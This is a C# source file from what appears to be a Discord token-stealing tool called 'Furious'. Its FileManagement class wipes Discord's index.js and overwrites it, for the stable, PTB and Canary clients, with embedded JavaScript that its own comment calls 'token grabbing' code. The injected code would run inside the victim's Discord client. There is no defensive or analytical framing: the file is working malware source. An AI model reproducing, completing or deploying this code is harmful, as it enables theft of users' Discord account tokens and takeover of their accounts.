using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading.Tasks;

namespace Furious
{
	internal class FileManagement
	{
		internal static string PTBPath
		{
			get { return _ptbpath; }
			set
			{
				_ptbpath = value;
			}
		}
		internal static string DiscordPath
		{
			get { return _discordpath; }
			set
			{
				_discordpath = value;
			}
		}

		internal static string CanaryPath
		{
			get { return _canarypath; }
			set
			{
				_canarypath = value;
			}
		}

		internal static async Task CleanFile(string path)
		{
			///Clears the targeted file of its contents.
			try
			{
				using (StreamWriter streamWriter = new StreamWriter(path))
				{
					await streamWriter.WriteAsync(string.Empty);
				}
			}
			catch
			{
				Debug.WriteLine("An error occured clearing index.js.");
			}
		}

		internal static async Task WriteDiscord(string path)
		{
			///Writes the token grabbing JavaScript code into the Discord directory.
			if (File.Exists(DiscordPath))
			{
				try
				{
					string value = string.Empty;
					using (StreamReader discordReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.index.txt")))
					{
						value = await discordReader.ReadToEndAsync();
					}
					using (StreamWriter discordWriter = new StreamWriter(path))
					{
						await discordWriter.WriteAsync(value);
					}
				}
				catch
				{
					Debug.WriteLine("Error writing to index.js in Discord path.");
				}
			}
			if (File.Exists(PTBPath))
			{
				try
				{
					string value;
					using (StreamReader ptbWriter = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.ptb.txt")))
					{
						value = await ptbWriter.ReadToEndAsync();
					}
					using (StreamWriter ptbWriter = new StreamWriter(path))
					{
						await ptbWriter.WriteAsync(value);
					}
				}
				catch
				{
					Debug.WriteLine("Error writing to index.js in DiscordPTB path.");
				}
			}
			if (File.Exists(CanaryPath))
			{
				try
				{
					string value;
					using (StreamReader canaryReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.canary.txt")))
					{
						value = await canaryReader.ReadToEndAsync();
					}
					using (StreamWriter canaryWriter = new StreamWriter(path))
					{
						await canaryWriter.WriteAsync(value);
					}
				}
				catch
				{
					Debug.WriteLine("Error writing to index.js in Discord Canary path.");
				}
			}
		}

		internal static string _ptbpath;
		internal static string _discordpath;
		internal static string _canarypath;
	}
}
